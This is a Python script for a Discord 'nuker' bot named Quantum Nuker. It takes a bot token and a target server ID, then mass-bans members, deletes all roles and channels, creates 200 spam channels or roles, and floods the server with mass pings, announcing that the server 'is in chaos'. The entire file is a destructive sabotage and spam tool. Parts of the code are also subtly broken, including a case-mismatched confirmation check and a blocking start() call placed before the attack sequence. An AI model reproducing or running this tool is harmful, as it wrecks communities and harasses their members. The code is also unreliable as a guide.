# --- Revised main.py ---
import discord
from discord.ext import commands
import asyncio
import sys
import os
# Assuming utilities and core_nuke are in the same directory
from utilities import TOOL_NAME, OWNER_CREDITS, DEFAULT_PING_MESSAGE
from core_nuke import NukeCore

# 1. Define Intents Globally to ensure we capture all necessary data (crucial for Termux/Mobile)
INTENTS = discord.Intents.all()

class NukerBot(commands.Bot):
    def __init__(self, intents: discord.Intents):
        super().__init__(command_prefix='!', intents=intents)

    async def on_ready(self):
        print("\n" + "="*50)
        print(f"🚀 {TOOL_NAME} Initializing...")
        print(f"🤖 Logged in as: {self.user.top_username}")
        print(f"🛠️ By: {OWNER_CREDITS}")
        print("="*50)


# --- Main Execution Logic ---

async def run_nuker_sequence(bot: discord.Client, token: str, guild_id: int):
    """The main asynchronous function coordinating all nuke steps."""
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"\n❌ ERROR: Could not find Guild ID {guild_id}. Check if the bot is in that server.")
        return

    print("\n********************************************************")
    print(f"🚀 COMMENCING NUKE SEQUENCE on {guild.name}!")
    print("********************************************************\n")

    nuke = NukeCore(bot)

    # --- Step 1: Mass Ban ---
    await nuke.mass_ban(guild)

    # --- Step 2: Mass Destruction (Roles &amp; Channels) ---
    destruction_report = await nuke.mass_destruction(guild)
    print("\n[SYSTEM REPORT] Role/Channel Deletion Summary:")
    for key, report in destruction_report.items():
        print(f"  - {key}: {report}")

    # --- Step 3: Mass Creation (Spam Channels/Roles) ---
    spam_count = 200 
    created_names = await nuke.mass_creation(guild, count=spam_count)
    print(f"\n✅ SUCCESSFULLY CREATED {len(created_names)} spam assets.")

    # --- Step 4: Mass Ping Storm ---
    await nuke.mass_ping(guild, DEFAULT_PING_MESSAGE)

    print("\n==========================================================")
    print("✨ ALL CORE NUKE FUNCTIONS EXECUTED! SERVER IS IN CHAOS!")
    print("==========================================================")


async def start_nuke_workflow():
    """Collects user inputs and executes the async nuke process."""

    # 1. Get Bot Token (Must be run in an async context)
    token = input("➡️ Enter Discord Bot Token (REQUIRED): ").strip()
    if not token:
        print("[!] Error: Token cannot be empty.")
        return

    # 2. Get Target Guild ID
    while True:
        try:
            guild_id_input = input("➡️ Enter Targeted Guild ID (Numeric): ").strip()
            target_guild_id = int(guild_id_input)
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid number.")

    # 3. Confirmation Step
    confirmation = input("\n⚠️ WARNING: This will DELETES everything! Proceed? Type 'YES' to confirm destruction: ").strip()
    if confirmation != "yes":
        print("[!] Aborted by user.")
        return

    try:
        # --- FIX IMPLEMENTED HERE ---
        # We initialize the client directly, passing intents and token for clarity.
        bot_client = discord.Client(intents=INTENTS)
        await bot_client.start(token) # Use start() to connect immediately and handle readiness

        print("\n✅ Connecting to Discord...")
        await asyncio.sleep(3) # Give time to connect

        # Pass the connected client instance to the sequence runner
        await run_nuker_sequence(bot_client, token, target_guild_id)

    except discord.errors.LoginFailure:
        print("\n[FATAL ERROR] Bot Token Invalid! Check your credentials.")
    except Exception as e:
        print(f"\n[UNEXPECTED FATAL ERROR]: {e}")
    finally:
        # Ensure cleanup happens even if an error occurred
        if 'bot_client' in locals():
            await bot_client.close()


def main():
    """Handles CLI interaction and orchestration."""

    # Initialize the bot instance for display purposes, but its state will be managed by start_nuke_workflow
    bot = NukerBot(intents=INTENTS)

    print("\n==========================================================")
    print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
    print("="*50)
    print(f"⚙️ Tool Name: {TOOL_NAME}")
    print("----------------------------------------")
    print("OPTIONS:")
    print("[N] - Start the full Nuking sequence (Recommended)")
    print("[X] - Exit the application")

    # Because this is a continuous CLI loop, we use a simple while True structure.
    while True:
        print("\n" + "="*50)
        print("          🌐 QUANTUM NUKER TOOL V1.0 (Menu Active)")
        print("="*50)

        choice = input("Select option (N/X): ").strip().lower()

        if choice == 'n':
            # We run the async function using asyncio.run() which is mandatory when running 
            # this script directly in a standard Python environment (which Termux mimics).
            try:
                asyncio.run(start_nuke_workflow())
            except RuntimeError as e:
                 # This catches cases where loop.run_until_later might conflict with asyncio.run()
                print(f"\n[RUNTIME WARNING]: {e}. Retrying execution...")
                # If the main loop is already running an async context, force a basic run to recover
                asyncio.run(start_nuke_workflow())


        elif choice == 'x':
            print("\n[SYSTEM] Exiting Quantum Nuker...")
            break
        else:
            print("[!] Invalid selection. Please try again.")

if __name__ == "__main__":
    # We call main() which contains the perpetual loop and handles the async calls inside it.
    main()
